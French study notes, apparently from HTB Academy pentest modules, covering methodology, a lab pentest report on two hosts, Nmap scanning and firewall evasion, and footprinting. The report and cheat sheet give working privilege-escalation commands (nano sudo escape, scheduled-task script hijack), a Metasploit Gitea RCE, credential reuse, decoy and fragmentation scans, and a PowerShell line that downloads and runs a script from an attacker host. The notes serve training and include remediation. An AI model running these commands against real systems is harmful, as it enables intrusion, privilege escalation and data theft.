5. **Post‑exploitation** (élévation, persistance, exfil tests).
6. **Mouvements latéraux** (relations de confiance, credentials).
7. **PoC** (reproductibilité, scripts, preuves).
8. **Reporting** (exec summary, technique, remédiations, risques).
9. **Remédiation & re‑tests** (accompagnement, validation correctifs).

## Prérequis d’une mission

- **Légal** : MSA/SoW, NDA, RoE ; **assurance** pro.
- **Scope** & fenêtres de test ; **assets sensibles** (exclusions/soin).
- **Canaux de comm & procédures d’urgence**.
- **Préparation environnement & outils** (isolés, à jour, licenciés).
- **Backups vérifiés** ; **exigences de reporting** (format, preuves).

## Compétences requises

- **Tech** : réseaux (TCP/UDP/HTTP/S, routage, subnet), OS (Linux/Windows), scripting (**Python**, Bash), sécurité (auth, chiffrement), vulnérabilités (SQLi, XSS, BOF…), outils (Nmap, Wireshark, Nessus/OpenVAS, Burp, Metasploit…).
- **Spécifiques** : web, mobile, cloud, API, wireless, RE.
- **Soft skills** : rédaction & pédagogie, gestion de projet/temps, éthique, mindset **adversarial**.
- **Veille continue**.

## Méthodologies & cadres

- **PTES** (7 phases : pré‑engagement → reporting).
- **NIST** (guide formel planif/exécution/post‑test).
- **OWASP TG** (web : IG → config/deploy → identité → auth).
- **MITRE ATT&CK** (tactiques/techniques réelles pour scénarios).
    
    → Usage **hybride** + méthodo **personnelle** (checklists, scripts, RETEX).
    

## Web Application Pentesting (essentiels)

- **3 tiers** : présentation, applicatif, base de données.
- Vulnérabilités majeures : **injections** (SQL/command), **auth & sessions**, **XSS**.
- Outils : **Burp Suite** / **OWASP ZAP**, DevTools, scripts (Python).
- **Légal/éthique** : permission explicite, divulgation responsable.

## Network Security Testing (essentiels)

- Vuln. fréquentes : services mal configurés, non‑patchés, **protocoles non sûrs** (FTP/Telnet/HTTP), faiblesse auth (MFA absent), segmentation faible, interfaces admin exposées, contrôles manquants.
- Outils : **Nmap**, **Nessus/OpenVAS**, **Metasploit**, **Wireshark**, **John/Hashcat**, **Aircrack‑ng** (Wi‑Fi).
- Pièges : bâcler la recon, dépendre des scanners, ignorer la vérification manuelle, faible communication.

## Cloud Security Testing

- **Modèles** : **IaaS / PaaS / SaaS** ; **Shared Responsibility Model** & AUP providers.
- Étapes : enum des ressources → IAM (rôles/permissions) → **config review** (buckets publics, SG) → réseau virtuel → sécurité des données (chiffrement, DLP, KMS) → appli & **API**.
- Vulnérabilités : IAM trop permissif, storage exposé, API faibles, logs/monitoring insuffisants, conteneurs (root, images obsolètes), segmentation cloud laxiste, crypto absente.
- Outils : cloud natifs (AWS Inspector, Azure Security Center), **Scout Suite**, **Prowler**, **CloudSploit** ; conteneurs (**Trivy, Clair, Anchore**); API (Postman, Burp).

## Physical Security Testing

- **OSINT** initial, repérage (caméras, patrouilles, habitudes).
- Techniques : **tailgating**, badges/RFID (clonage), lockpicking (autorisé), test de procédures d’accueil.
- **RoE à porter** en permanence ; respect vie privée & sécurité des personnes.

## Social Engineering (SE)

- Leviers psycho : **Autorité**, **Urgence**, **Peur**, **Curiosité**, **Confiance**.
- Techniques : **phishing**, **spear‑phishing**, **pretexting**, **baiting**, **tailgating**.
- **Ethique** : autorisation stricte, soutien aux employés, pas de dommages psychologiques.

## Mobile Security Testing

- **Environnement** : Android (root/non‑root), iOS (jailbreak/non‑JB), émulateurs.
- Outils : **ADB**, **JADX**/Ghidra (reverse), **Frida**/**Objection** (runtime), Burp Mobile Assistant.
- Android : APK, manifeste/permissions, statique (JADX), dynamique (Frida).
- iOS : IPA (souvent à déchiffrer), sandbox/code signing ; focus **Keychain**, pinning, stockage local, URL schemes, biométrie.
- Vuln. : stockage non sûr (tokens en clair), TLS/pinning mal fait, injections côté client (DB locale/WebView), contournements runtime.

## Reverse Engineering (RE)

- Bases : archi CPU, **assembleur**, mémoire (**stack**/heap/segments), syscalls.
- Outils : **IDA Pro**, **Ghidra**, **radare2** ; **GDB/WinDbg/x64dbg** ; **dnSpy/ILSpy/JADX**.
- Analyses : **statique** (sans exécuter) vs **dynamique** (exécution instrumentée).
- Cas : malware, bypass d’auth, analyse de protocoles ; protections : obfuscation, packing, anti‑debug.

## Exploitation des résultats

- **Rapport** : description technique + **impact métier**, preuves, **cotation (CVSS)**, priorisation.
- **Remédiations** : quick wins (mitigations) + correctifs durables (root cause), pas “patcher” générique mais **actions concrètes**.
- **Support** : Q/R, contrôles compensatoires, priorisation, **re‑tests** documentés.
- **Améliorations durables** : sensibilisation, politiques, SDLC sécurisé, monitoring continu, IRP.

## Quotidien d’un pentester

- Veille matinale (CVE/actu), planification ; recon/scans ; exploitation l’aprèm (manuel/scripts/SE) ;
- Analyse, tri des FP, **rédaction** et échanges client ;
- **Apprentissage continu** (labs, bounties, confs).

## Le métier

- Demande forte (tous secteurs), salaires compétitifs, trajectoires variées (senior, lead, archi, CISO, consulting).
- **Défis** : rythme des menaces, deadlines, confidentialité, équilibre de vie.
- **Croissance** : cloud/IoT/IA ; **l’automatisation & l’IA** augmentent, ne remplacent pas l’humain.

### Outils par domaine (express)

- **Réseau** : Nmap, Nessus/OpenVAS, Wireshark, Metasploit.
- **Web/API** : Burp/ZAP, ffuf, sqlmap, Postman.
- **Cloud** : Scout Suite, Prowler, CloudSploit, AWS/Azure/GCP natifs.
- **Mobile** : ADB, Frida, Objection, JADX, Ghidra.
- **Wireless** : Aircrack‑ng, hcxdumptool/hcxtools.
- **RE** : IDA, Ghidra, radare2, x64dbg/WinDbg, dnSpy/ILSpy.

## **Pentest in a Nutshell**

## Résumé exécutif

Lors de l’évaluation « Pentest in a Nutshell », deux hôtes de labo ont été évalués.

- **Linux (Ubuntu 22.04.4 LTS, 5.15.0)** : accès initial via services exposés (FTP anonyme/WordPress) permettant la récupération de la clé SSH de *john*. Élévation de privilèges **root** à l’aide de **sudo** (droit NOPASSWD sur **nano** et `(ALL:ALL) ALL`) puis pillage (clés SSH, mots de passe WordPress, etc.).
- **Windows (Server 2019 Standard x64, WIN01)** : surface réseau (SSH, RPC/SMB, RDP, Gitea 1.12.4). Accès initial via **Gitea Git Hooks RCE** et/ou identifiants réutilisés **john / SuperSecurePass123** (trouvés dans un script sur un partage SMB). Élévation de privilèges locale par **détournement de tâche planifiée** (script PowerShell **backupprep.ps1** exécuté en *Administrator* et **modifiable**), ajout de *john* au groupe **Administrators**.
- **Impact démontré** : exfiltration de données sensibles (fichier **customer_database.csv** contenant PII/CB), compromission administrateur, clés SSH de service, exposition SMBv1, Git auto‑hébergé obsolète.

**Risques majeurs** :

- Mauvaises ACL (Everyone:F) sur scripts d’admin et sur *ProgramData*
- Réutilisation/crédentials en dur
- Version Gitea vulnérable (< 1.13.0, hooks activés)
- Sudoers trop permissif (Linux) et appartenance de *www‑data* au groupe *john*

## Portée & Méthodologie

- **Méthodo :** PTES / Kill Chain : *Recon → Énumération → Évaluation de vulnérabilités → Exploitation → Post‑Exploitation (Escalade) → Pillage → Preuve de concept*.
- **Règles :** actions limitées aux hôtes fournis. Toute « persistence » mise en place est documentée et réversible.

## Chronologie détaillée par hôte

### Linux (10.129.159.216)

### Information Gathering

- **Nmap** (exemple) : découverte FTP/HTTP(S)/WordPress.
- **FTP anonyme** : répertoire personnel de *john* exposé.
- **WordPress** : installation fonctionnelle; wp‑config plus tard pillé côté root.

### Accès initial

- **FTP anonyme** → téléchargement de fichiers de *john* (dont **~/.ssh/id_rsa**).
- **SSH** : `ssh -i id_rsa john@10.129.159.216` (clé non protégée par passphrase) → **shell john**.

> Alternative notée par le module : l’utilisateur www‑data appartient au groupe john, ce qui permettait de lire les fichiers de john via un accès web.
> 

### Élévation de privilèges

- `sudo -l` → **(root) NOPASSWD: /usr/bin/nano** et **(ALL:ALL) ALL**.
    - **Méthode GTFObins (nano)** : `sudo nano x` → `Ctrl+R` `Ctrl+X` → `reset; /bin/bash 1>&0 2>&0` → **root**.
    - **Méthode directe** : `sudo su` (mot de passe **SuperSecurePass123** pour *john* connu).

### Pillage (root)

- **linpeas.sh** (root) :
    - **/root/.ssh/id_rsa** présent.
    - **/var/www/** → `wp-config.php` : `DB_USER=wpuser`, `DB_PASSWORD=MyVeryStrongPa$$`.
    - AppArmor profils chargés (snap/lxd), **ASLR activé**, **Seccomp désactivé**.
    - SUID/SGID multiples.
- **linpill.sh** : inventaire/artefacts (SUID=55, etc.).

### Constats & Recos (Linux)

- **Sudoers** : supprimer `NOPASSWD: /usr/bin/nano` et limiter `(ALL:ALL) ALL`.
- **Groupes** : retirer *www‑data* du groupe *john*.
- **Secrets** : rotation des clés SSH et mots de passe (john, DB).
- **Durcissement** : appliquer correctifs kernel; revue SUID; surveiller `.bash_history` et permissions home.

### Windows (10.129.130.98 / WIN01)

### Information Gathering (externe)

- **Nmap** : `22,135,139,445,3000 (Gitea),3389 (RDP)` ouverts; **SMBv1=True**; hôte **WIN01**; Gitea **1.12.4**.
- **CME/SMB** : session invitée possible; partages **ADMIN$**, **C$**, **Devs**, **IPC$**.

### Accès initial

- **Spider du partage *Devs*** avec **john/SuperSecurePass123** → `tmp.ps1` contenant identifiants codés en dur (`WIN01\john / SuperSecurePass123`).
- **Hydra (validation RDP)** : identifiants valides.
- **Exploit Gitea** : **gitea_git_hooks_rce** (Metasploit, *Windows Dropper*) sur **1.12.4** → **meterpreter**.
- **Connexion RDP** : `xfreerdp /u:john /p:SuperSecurePass123 /v:10.129.130.98`.

### Énumération locale

- `whoami /priv` : **SeImpersonatePrivilege** présent.
- **winPEAS** :
    - **Écriture** sur **C:\ProgramData**.
    - **Tâche planifiée** **\CorpBackupAgent** (toutes les 2 min) exécutant **C:\ProgramData\CorpBackup\Scripts\backupprep.ps1** **en Administrator**.
    - ACL du script : **Everyone:(F)**.

### Élévation de privilèges (PoC)

- Injection dans **backupprep.ps1** :
    
    ```powershell
    Add-LocalGroupMember -Group "Administrators" -Member "WIN01\john"
    
    ```
    
- Exécution : `schtasks /run /tn \CorpBackupAgent` → `net user john` **→ Administrators**.

### Pillage & preuves

- **Données sensibles** : `C:\Users\Administrator\customer_database.csv` (PII : noms, SSN, cartes bancaires, etc.).
    - **ID client de *Nicholas Taylor*** (extrait) : **7d660ce6-fb54-4006-8446-5ae1b3ae1064**.
- **Chemin ADMIN$** : **C:\Windows**.
- **Wireshark** : **4.2.5** (ProductVersion).
- **Règles firewall activées** (compte rendu via parsing **netsh**) : **198**.

### Recos (Windows)

- **Gitea** : mise à jour ≥ **1.13** (hooks désactivés par défaut) et config `DISABLE_GIT_HOOKS=true`.
- **Secrets** : supprimer identifiants en dur, appliquer **LAPS/EntraID** ; rotation des mots de passe.
- **Tâches planifiées** : restreindre ACL (retirer **Everyone:F**), signer les scripts, stocker dans un dépôt sécurisé.
- **SMB** : **désactiver SMBv1**, activer signature/NTLMv2, auditer partages.
- **Durcissement** : Appliquer correctifs Windows, réduire services, surveiller RDP (NLA/MFA).
- **Détection** : règles SIEM pour modifications de groupes Admin, exécutions de tâche anormales, création de dépôts Gitea inhabituels.

## Vulnérabilités clés & preuves

| ID | Actif | Vulnérabilité | Preuve/Artefact | Impact | Remédiation |
| --- | --- | --- | --- | --- | --- |
| L‑01 | Linux | Sudoers permissif : `NOPASSWD: /usr/bin/nano` + `(ALL:ALL) ALL` | `sudo -l`, échappement **nano** | Root immédiat | Retirer NOPASSWD, limiter sudo par commande et par groupe |
| L‑02 | Linux | Accès FTP anonyme au home de *john* | Liste FTP, récupération `~/.ssh/id_rsa` | Accès SSH sans mot de passe | Désactiver FTP anonyme, permissions strictes sur home/`.ssh` |
| L‑03 | Linux | Secrets en clair (WordPress) | `wp-config.php` | Mouvement latéral DB et réutilisation | Vault/gestion secrets, rotation |
| W‑01 | WIN01 | **Gitea 1.12.4** vulnérable (hooks RCE) | Exploit MSF, shell | RCE appli | Mettre à jour, désactiver hooks |
| W‑02 | WIN01 | **SMBv1 activé** | CME output | Surface d’attaque accrue (EternalBlue, etc.) | Désactiver SMBv1 |
| W‑03 | WIN01 | Script **backupprep.ps1** modifiable **Everyone:F** | `icacls` | Escalade par **task hijacking** | Durcir ACL / signer scripts |
| W‑04 | WIN01 | Creds en dur (**john/SuperSecurePass123**) | `tmp.ps1` + hydra | Reuse / compromission comptes | Supprimer, rotations, SSO |

## Preuve de Concept (commandes minimales)

### Linux → root

```bash
# Récupération clé via FTP anonyme
ftp 10.129.159.216
# ... get .ssh/id_rsa
chmod 600 id_rsa && ssh -i id_rsa john@10.129.159.216

# Privesc via nano (GTFObins)
sudo -l
sudo /usr/bin/nano any
# Ctrl+R, Ctrl+X, puis :
reset; /bin/bash 1>&0 2>&0
id

```

### Windows → admin

```bash
# Énum SMB & script sensible
crackmapexec smb 10.129.130.98 -u guest -p '' --shares
crackmapexec smb 10.129.130.98 -u john -p 'SuperSecurePass123' --spider Devs
crackmapexec smb 10.129.130.98 -u john -p 'SuperSecurePass123' --share Devs --get-file tmp.ps1 tmp.ps1

# Exploit Gitea (optionnel) : msf6 exploit/multi/http/gitea_git_hooks_rce

# Escalade via tâche planifiée
powershell -c "Add-Content -Path 'C:\\ProgramData\\CorpBackup\\Scripts\\backupprep.ps1' -Value 'Add-LocalGroupMember -Group \"Administrators\" -Member \"WIN01\\john\"'"
schtasks /run /tn \CorpBackupAgent
net user john

```

## Artefacts & Restauration

- **Fichiers modifiés** :
    - `C:\ProgramData\CorpBackup\Scripts\backupprep.ps1` (ligne ajoutée)
    - `C:\ProgramData\CorpBackup\Logs\*.log` (entrées supplémentaires)
- **Comptes/Groupes** : *WIN01\john* ajouté à **Administrators**.
- **Nettoyage** :
    - Retirer la ligne injectée dans `backupprep.ps1`.
    - `net localgroup Administrators john /delete`.
    - Supprimer scripts/POC déposés et clés copiées.
    - Restaurer ACL (`icacls`) sur `ProgramData/CorpBackup`.

## Annexe — « Cheat‑sheet » de commandes

- **Nmap** : `nmap -p- -sV -sC -T4 -Pn <IP>`
- **FTP** : `ftp <IP> 21` (anonymous)
- **WordPress** : `wpscan --url https://<host> --disable-tls-checks -e p`
- **CME** : `crackmapexec smb <IP> --shares`, `-spider <share>`, `-get-file`
- **Hydra (RDP)** : `hydra -l john -p 'SuperSecurePass123' rdp://<IP>`
- **RDP** : `xfreerdp /u:john /p:'...' /v:<IP>`
- **Privesc Linux** : `sudo -l`, `sudo nano`, GTFObins escape
- **Privesc Windows** : `icacls <path>`, `schtasks /query /v`, `Add-LocalGroupMember`
- **WinPEAS** : `IEX(New-Object Net.WebClient).DownloadString('http://<attacker>:8080/winPEAS.ps1')`
- **LinPEAS** : `bash /path/linpeas.sh`

## **Network Enumeration with Nmap**

## Résumé exécutif

Ce module montre comment passer d’un simple balayage réseau à une **énumération précise et exploitable** : détection d’hôtes/ports, identification de services/versions, utilisation de **Nmap Scripting Engine (NSE)**, **optimisation des performances**, et **contournement FW/IDS/IPS** (ports source « de confiance », fragmentation, décoys, etc.).

Les labs illustrent la logique :

- **Default** : lire un **flag dans une bannière** (31337/tcp).
- **Medium** : récupérer la **version DNS** via **UDP + CHAOS** `version.bind`.
- **Hard** : ouvrir un service masqué (**50000/tcp**) en **faisant passer le trafic pour du DNS** (`-source-port 53`) et en extraire **version/flag**.

## Énumération : philosophie (Page 1)

- L’énumération est **le cœur** du pentest : comprendre **quoi** est exposé et **comment** dialoguer avec **chaque service**.
- Les outils (Nmap, dig, smbclient, curl, ncat…) **ne remplacent pas** la compréhension des protocoles (HTTP/FTP/SMTP/DNS/SMB…).
- **Manuel + outillé** : quand un scanner « time-out », on tente **d’autres angles** (ports source, délais, bannières, commandes applicatives).

## Découverte & scan d’hôtes/ports (Host Enumeration)

### Démarrages sûrs (ICMP/DNS souvent filtrés sur HTB)

```bash
# Top 1000 TCP – rapide et fiable
sudo nmap -Pn -n -sS --top-ports 1000 -T4 --max-retries 2 -oA top <IP>

# Full TCP (si la cible répond bien)
sudo nmap -Pn -n -sS -p- --min-rate 2000 -T4 --max-retries 2 -oA full <IP>

# UDP (échantillon)
sudo nmap -Pn -n -sU --top-ports 200 -T3 --max-retries 1 -oA udp_top <IP>

```

### Extraction des ports ouverts pour la suite

```bash
ports=$(awk '/^[0-9]+\/tcp[[:space:]]+open/{print $1}' full.nmap | cut -d/ -f1 | paste -sd,)

```

## Nmap Scripting Engine (NSE) (Page 7)

**Catégories clés** : `default`, `safe`, `version`, `vuln`, `auth`, `brute`, `discovery`…

**Usage** :

```bash
# Scripts par défaut
sudo nmap -Pn -n -sV -p"$ports" -sC -oA nse_default <IP>

# Scripts ciblés (HTTP, bannières, mail, SMB, etc.)
sudo nmap -Pn -n -sV -p"$ports" \
  --script "banner,default,safe,http-title,http-headers,http-server-header,http-enum,http-methods,\
smb-os-discovery,smb-enum-shares,pop3-capabilities,imap-capabilities,ftp-anon,ftp-syst,smtp-commands" \
  -oA nse_sweep <IP>

# Catégorie vuln
sudo nmap -Pn -n -sV -p80 --script vuln -oA nse_vuln <IP>

```

> ⚠️ Si Nmap crie qu’un script n’existe pas (ex. pgsql-info) : retire-le et/ou lance nmap --script-updatedb.
> 

## Scan agressif & fingerprinting rapide

```bash
# -A = -sV + -O + traceroute + -sC (scripts par défaut)
sudo nmap -Pn -n -p80 -A -oA aggr <IP>

```

## Performance (Page 8)

**Templates** : `-T0 … -T5` (paranoïde → insane).

**Astuces** :

```bash
# Ajuster délais & cadence (ne pas trop serrer sous peine de faux négatifs)
--initial-rtt-timeout 50ms --max-rtt-timeout 200ms --max-retries 2 --min-rate 1200

# Exemple « équilibré »
sudo nmap -Pn -n -sS -p- --min-rate 2000 -T4 --max-retries 2 -oA perf <IP>

```

## Évasion FW/IDS/IPS (Pages 9–12)

### Mapper le filtrage

```bash
# ACK-scan : où l’ACK traverse (unfiltered) / bloque (filtered)
sudo nmap -Pn -n -sA --top-ports 1000 --reason -oA ackmap <IP>

# Null/Fin/Xmas : tests stateless
sudo nmap -Pn -n -sN -p1-1000 -oA null <IP>
sudo nmap -Pn -n -sF -p1-1000 -oA fin  <IP>
sudo nmap -Pn -n -sX -p1-1000 -oA xmas <IP>

```

### Ports source « de confiance » (DNS/NTP/HTTPS)

Les pare-feu laissent souvent passer le trafic **depuis** 53/UDP/TCP, 123/UDP, 443/TCP.

```bash
# Ouvrir un port « filtered » via DNS (TCP 53 en source)
sudo nmap -Pn -n -sS -p50000 --source-port 53 -e tun0 -vv --packet-trace <IP>

```

> Important : --source-port ne marche pas avec -sT. Utiliser -sS (raw).
> 

### Décoys & fragmentation

```bash
sudo nmap -Pn -n -sS -p80 -D RND:5 -oA decoy <IP>   # brouille les logs
sudo nmap -Pn -n -sS -p1-200 --mtu 8 -oA frag <IP>  # fragmentation

```

## Labs – Démos et résultats

### **Default Lab** – *Flag en bannière*

- **Objectif** : lire un flag sur un service « bavard ».
- **Technique** : NSE `banner` + scan port `31337`.
    
    **Exemple (réel)** :
    

```
31337/tcp open  Elite
banner: 220 HTB{##}

```

### **Medium Lab** – *Version du DNS (UDP requis)*

- **VPN** : profil **UDP 1337**.
- **But** : obtenir la **version DNS** (souvent BIND/dnsmasq/MSDNS).
    
    **Méthode A – dig CHAOS** :
    

```bash
# Confirme 53/udp
sudo nmap -sU -Pn -n -p53 -e tun0 -oA dns_check 10.129.2.48

# Version (CHAOS)
dig @10.129.2.48 -p 53 -c CH -t TXT version.bind +short
# variantes
dig @10.129.2.48 -p 53 -c CH -t TXT version.server +short
dig @10.129.2.48 -p 53 -c CH -t TXT hostname.bind +short

# Si filtrage strict : simule une requête « DNS depuis DNS »
dig @10.129.2.48 -p 53 -c CH -t TXT version.bind +short +srcport=53

```

**Méthode B – Nmap** :

```bash
sudo nmap -Pn -n -sU -p53 -sV --version-intensity 9 \
  --script dns-nsid,dns-recursion -e tun0 -oA dns_nmap 10.129.2.48

```

### **Hard Lab** – *Service masqué, version/flag via source-port 53*

- **Cible** : `10.129.2.47`.
- **Découverte** :
    - TCP normal : `22/tcp open ssh`, `80/tcp open http`.
    - Avec `-source-port 53` (trafic DNS) : **`50000/tcp open`** apparaît.
- **Preuve d’ouverture (SYN)** :

```bash
sudo nmap -Pn -n -sS -p50000 --source-port 53 -e tun0 -vv --packet-trace 10.129.2.47
# RCVD SA → 50000/tcp open

```

- **Lecture de bannière** (port 53 local occupé ⇒ binder sur l’IP **tun0**) :

```bash
tunip=$(ip -4 addr show dev tun0 | awk '/inet/{print $2}' | cut -d/ -f1)

# Déclenche la bannière (FTP probable)
printf '\r\n' | sudo ncat -nv -s "$tunip" --source-port 53 10.129.2.47 50000
printf 'FEAT\r\nSYST\r\nQUIT\r\n' | sudo ncat -nv -s "$tunip" --source-port 53 10.129.2.47 50000

```

- **Ce qu’on soumet** :
    - si la bannière contient `HTB{…}` → **le flag** tel quel ;
    - sinon, la **version** (ex. `ProFTPD 1.3.5b`).
- **Note** : 22/80 montrent aussi `OpenSSH 7.6p1 Ubuntu 4ubuntu0.7` & `Apache/2.4.29 (Ubuntu)` — utiles, mais **l’objectif** est le service rendu visible **grâce** au **source-port 53** (50000/tcp).

## Pièges & dépannage (rencontrés en pratique)

- **Placeholder non remplacé** (`10.129.X.Y`) → « Failed to resolve ».
- **Variable vide** (`fport=""`) → « Your port specifications are illegal ».
- **Script NSE inexistant** (`pgsql-info`) → retire-le, `nmap --script-updatedb`.
- **`-source-port` ignoré** avec `sT` → utiliser `sS`.
- **`ncat` ne bind pas 53** (« Address already in use ») → binder sur **tun0** (`s $tunip`) ou stopper `systemd-resolved` momentanément.
- **Greps trop larges** (capturent « Not shown ») → filtrer précisément :

```bash
awk '/^[0-9]+\/tcp[[:space:]]+filtered/ {print $1}' top.nmap

```

## Cheatsheet express

### Scans essentiels

```bash
sudo nmap -Pn -n -sS --top-ports 1000 -T4 --max-retries 2 -oA top <IP>
sudo nmap -Pn -n -sS -p- --min-rate 2000 -T4 --max-retries 2 -oA full <IP>
sudo nmap -Pn -n -sU --top-ports 200 -T3 --max-retries 1 -oA udp_top <IP>

```

### NSE utile

```bash
sudo nmap -Pn -n -sV -p"$ports" \
  --script "banner,default,safe,http-title,http-headers,http-server-header,http-enum,http-methods,\
smb-os-discovery,smb-enum-shares,pop3-capabilities,imap-capabilities,ftp-anon,ftp-syst,smtp-commands" \
  -oA nse_sweep <IP>

```

### Perf & fiabilité

```bash
--initial-rtt-timeout 50ms --max-rtt-timeout 200ms --max-retries 2 --min-rate 1200 -T3/4

```

### Évasion FW/IDS

```bash
sudo nmap -Pn -n -sA --top-ports 1000 --reason -oA ack <IP>       # carto FW
sudo nmap -Pn -n -sS -p50000 --source-port 53 -e tun0 <IP>        # faux DNS
sudo nmap -Pn -n -sS -p1-200 --mtu 8 -oA frag <IP>                # fragmentation
sudo nmap -Pn -n -sS -p80 -D RND:5 -oA decoy <IP>                 # décoys

```

### DNS version (Medium Lab)

```bash
dig @<IP> -p 53 -c CH -t TXT version.bind +short +srcport=53

```

### Lecture bannière (Hard Lab)

```bash
tunip=$(ip -4 addr show dev tun0 | awk '/inet/{print $2}' | cut -d/ -f1)
printf 'FEAT\r\nSYST\r\nQUIT\r\n' | sudo ncat -nv -s "$tunip" --source-port 53 <IP> 50000

```

## Annexes – scripts utiles

### Sweep « propre » + grep flag (Default-style)

```bash
out="nmap_mod_$(date +%H%M%S)"; mkdir -p "$out"; target=<IP>
sudo nmap -Pn -n -p- --min-rate 4000 -T4 -oA "$out/all" "$target"
ports=$(awk '/open/{print $1}' "$out/all.nmap" | cut -d/ -f1 | paste -sd,)
sudo nmap -Pn -n -sV -p "$ports" \
  --script "banner,default,safe,http-title,http-headers,http-robots.txt,http-enum,http-methods,\
smb-os-discovery,smb-enum-shares,pop3-capabilities,imap-capabilities,ftp-anon,ftp-syst,smtp-commands" \
  -oA "$out/nse" "$target"
grep -niE 'HTB\{[^}]+\}|FLAG\{[^}]+\}' "$out"/nse.* || true

```

### Hard-style – ouverture par source-port 53 + bannière

```bash
target=<IP>; out="hard_$(date +%H%M%S)"; mkdir -p "$out"
sudo nmap -Pn -n -sS -p- --source-port 53 -e tun0 -oA "$out/tcp_sp53" "$target"
ports=$(awk '/open/{print $1}' "$out/tcp_sp53.nmap" | cut -d/ -f1 | paste -sd,)
[ -n "$ports" ] && sudo nmap -Pn -n -sV --version-intensity 9 -p "$ports" \
  --source-port 53 -e tun0 --script "banner,fingerprint-strings" -oA "$out/ver_sp53" "$target"
tunip=$(ip -4 addr show dev tun0 | awk '/inet/{print $2}' | cut -d/ -f1)
printf 'FEAT\r\nSYST\r\nQUIT\r\n' | sudo ncat -nv -s "$tunip" --source-port 53 "$target" 50000 | tee "$out/p50000.txt"

```

Le module démontre que **savoir dialoguer** avec les services (bannières, verbes/protos, scripts NSE ciblés) et **adapter** les scans (timing/perf/évasion) fait passer de « rien ne répond » à « version/flag obtenu ».

Retiens **trois réflexes** :

1. **NSE ciblé + lecture de bannière** (souvent le flag est là).
2. **Évasion** par **ports source de confiance** (`-source-port 53`) quand tout est « filtered ».
3. **Ne pas “forcer”** : adapter timing/RTT/retries plutôt que multiplier les scans agressifs.

## **Footprinting**

# **Enumeration Principles**

L’**enumeration** est la phase où l’on collecte activement des informations sur une cible (DNS, ports, services, technologies…).

Elle est différente de l’**OSINT**, qui repose uniquement sur la collecte passive.

On ne cherche pas “à entrer”, mais à **comprendre comment entrer**.

### Objectif réel de l’énumération

Développer une vision globale de :

- l'infrastructure
- les services exposés
- les défenses
- la logique technique derrière l’entreprise

Cette étape conditionne tout le pentest.

Une erreur courante : brute-forcer trop tôt → **bruit**, **blacklisting**, **perte de temps**.

### Les questions fondamentales

**Ce que nous voyons :**

- Qu’est-ce qui est exposé ?
- Pourquoi est-ce visible ?
- Comment l’utiliser ?

**Ce que nous ne voyons pas :**

- Qu’est-ce qui devrait exister mais ne répond pas ?
- Pourquoi ce n’est pas visible ?
- Que révèle cette absence ?

### Principes d’énumération

| Nº | Principe |
| --- | --- |
| 1 | Il y a plus que ce que l’on voit. Toujours considérer plusieurs points de vue. |
| 2 | Distinguer ce qu’on voit de ce qu’on ne voit pas. |
| 3 | Il existe toujours un moyen d’obtenir plus d’informations. Comprendre la cible. |

Ces principes guident toutes les étapes suivantes.

# **Enumeration Methodology**

L’énumération doit suivre une méthodologie **statique** (structure) mais **adaptable** (pratique).

HTB propose un modèle en **6 couches**, comparable à des murs successifs à franchir.

### **Les 6 couches d’énumération**

| Layer | Objectif | Informations |
| --- | --- | --- |
| **1. Internet Presence** | Identifier toute la surface exposée | Domaines, subdomains, ASN, IP, cloud |
| **2. Gateway** | Comprendre les protections | Firewall, proxies, IPS/IDS, segmentation |
| **3. Accessible Services** | Lister & analyser tous les services accessibles | ports, versions, bannières, config |
| **4. Processes** | Comprendre ce que les services *font* | tâches, flux, sources, destinations |
| **5. Privileges** | Comprendre les permissions internes | users, groupes, droits |
| **6. OS Setup** | Analyse post-compromission du système | OS, patchs, config, fichiers sensibles |

### Vision globale :

Un pentest = un **labyrinthe**

Chaque vulnérabilité = une **ouverture**

Toutes les ouvertures ne mènent pas à l’intérieur → priorité au **temps** et à la **pertinence**.

# **Domain Information (Passive Recon)**

Avant de scanner, on **observe** :

- site web principal
- textes, services, technologies mentionnées
- sous-domaines
- prestataires
- cloud
- mails
- certificats SSL

## Analyse du certificat SSL

Exemple :

```
inlanefreight.htb
www.inlanefreight.htb
support.inlanefreight.htb

```

Les certificats montrent souvent :

- des sous-domaines oubliés
- des environnements de staging
- des services internes exposés par erreur

## Certificate Transparency (crt.sh)

Recherche automatisée :

```bash
curl -s https://crt.sh/?q=inlanefreight.com&output=json | jq .

```

Puis extraction des subdomains uniques :

```bash
curl -s https://crt.sh/?q=inlanefreight.com&output=json \
| jq . | grep name | cut -d":" -f2 | grep -v "CN=" \
| cut -d'"' -f2 | tr '\\n' '\n' | sort -u

```

→ liste complète de sous-domaines pour brute-forcing / vhost bruteforcing.

## Résolution DNS + identification des hôtes internes

```bash
for i in $(cat subdomainlist); do
    host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4
done

```

On identifie :

- les IP **hébergées par l’entreprise**
- les IP **hébergées par des tiers (à exclure du test)**

## Analyse Shodan automatisée

```bash
for i in $(cat ip-addresses.txt); do shodan host $i; done

```

Cela révèle :

- services exposés
- bannières
- versions vulnérables
- SSL/TLS weak ciphers
- OS fingerprinting

## Analyse DNS approfondie

```bash
dig any inlanefreight.com

```

À surveiller :

### TXT records → mine d’information

Exemples réels trouvés :

- atlassian-domain-verification → Atlassian utilisé
- google-site-verification → GSuite / Cloud
- logmein-verification → accès distant
- SPF/DMARC → sources mail autorisées
- IP internes supplémentaires

→ Ces données suggèrent technologies internes et prestataires.

# **Cloud Resources**

Les entreprises exposent involontairement des ressources cloud :

- **AWS S3**
- **Azure Blob**
- **Google Cloud Storage**

## Identifier les buckets via DNS

Exemple dans la zone DNS :

```
s3-website-us-west-2.amazonaws.com

```

## Google Dorks pour cloud leaks

AWS :

```
intext:"companyname" inurl:amazonaws.com

```

Azure :

```
intext:"companyname" inurl:blob.core.windows.net

```

GCP :

```
intext:"companyname" inurl:storage.googleapis.com

```

## GrayHatWarfare

Très puissant :

Recherche par nom → affiche fichiers accessibles (images, docs, **SSH keys**, backups…)

Exemple critique observé :

```
id_rsa
id_rsa.pub

```

→ Compromission totale en cas de clé privée exposée.

# **Staff OSINT**

Analyser les employés = comprendre **l’infrastructure technique interne**.

Sources :

- LinkedIn
- GitHub
- Job posts
- Conférences / talks
- CVs / portfolios

### Informations utiles :

✔ langages utilisés

✔ frameworks internes

✔ solutions cloud

✔ outils CI/CD

✔ versions vulnérables mentionnées

✔ intérêts récents (ex : Kubernetes, Flask, etc.)

### Exemple tiré du module :

Un employé publie un code contenant :

- son email personnel
- un **JWT hardcodé**

Un autre annonce maîtriser :

- Django → chercher erreurs de config
- Flask → secrets faibles
- React/Angular → risques XSS
